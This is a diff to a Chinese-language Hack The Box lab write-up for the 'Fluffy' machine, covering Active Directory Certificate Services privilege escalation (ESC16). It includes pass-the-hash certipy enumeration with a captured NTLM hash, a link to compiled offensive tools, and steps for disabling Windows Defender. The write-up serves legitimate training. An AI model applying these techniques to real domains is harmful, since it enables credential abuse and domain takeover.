@@ -346,3 +346,91 @@ ADCS        10.129.232.88   389    DC01             Found CN: fluffy-DC01-CA
 | 有可能存在 ESC 漏洞    | ✅    |
 #### 由于我们知道ADCS安装在域控制器上，我们可以使用证书来查找易受攻击的漏洞模板。为此，我们必须使用检索到的ca_svc用户的RC4散列早些时候。
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally
+
+### 0.尝试一下使用windows环境
+#### 1.在win11添加域名：搜索'记事本‘,管理员权限打开，在路径C:\Windows\System32\drivers\etc\hosts添加域名，最后所有文件 (*.*)保存。
+#### 2.Google搜索‘Certify\bin\x64\Release\Certify.exe‘
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+#### Certify / Rubeus / SharpHound / bloodyAD 全部在 Defender 默认杀软特征库里(windows)
+```
+操作路径（Win11 中文）：
+Windows 安全中心
+病毒和威胁防护
+管理设置
+关闭：
+✅ 实时保护
+（可选）云提供的保护
+（可选）自动提交样本
+⏱ 只在你运行工具时关闭，用完再开
+```
+```
+PS C:\Users\11xiaohei\Desktop> echo $env:PROCESSOR_ARCHITECTURE
+ARM64
+```
+#### ARM64 + Defender + x64 红队工具 = 地狱模式
+#### Certify 在「非域 Windows + ARM64 + 非企业网络」环境下，本质上不可用。已经把 Certify 能踩的坑 全部踩完并排除了
+
+### 1.判定ESC16的条件
+```
+1️⃣ CA 不强制 SAN / Web Enrollment 关闭
+User Specified SAN : Disabled
+Web Enrollment     : Disabled
+Request Disposition: Issue
+2️⃣ ADCS 可用
+(objectClass=pKIEnrollmentService)
+Found CN: fluffy-DC01-CA
+3️⃣ 你已经能通过 shadow credentials + PKINIT 交互
+这恰恰是 ESC16 的“前置舞台”
+真正的验证方式只有一个：
+直接用证书 → 请求 TGT → 看 Kerberos 是否接受
+certipy auth -pfx xxx.pfx -dc-ip 10.10.11.69
+如果能成功换到 TGT → ESC16 成立
+
+如果满足以下 3 点，你就“按 ESC16 打”，不用等 Certipy 承认：
+1️⃣ 有 ADCS
+2️⃣ 无明显 ESC1~ESC8
+3️⃣ 能玩 PKINIT / Shadow Credentials
+ 这题 99% 就是 ESC16
+```
+#### 当所有命令都在非root执行时，依旧是没有出现‘ESC16’的字样
+```
+[★]$ certipy find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'fluffy-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+#### 根据官方文档：应该分析证书工具的输出，以确定此安装容易受到ESC16攻击。这种攻击利用了一个错误的配置，其中CA被全局配置为禁用包括szOID_NTDS_CA_SECURITY_EXT安全扩展。
+#### 要利用这一点，我们首先需要将ca_svc用户的UPN（用户主体名称）更新为管理员。
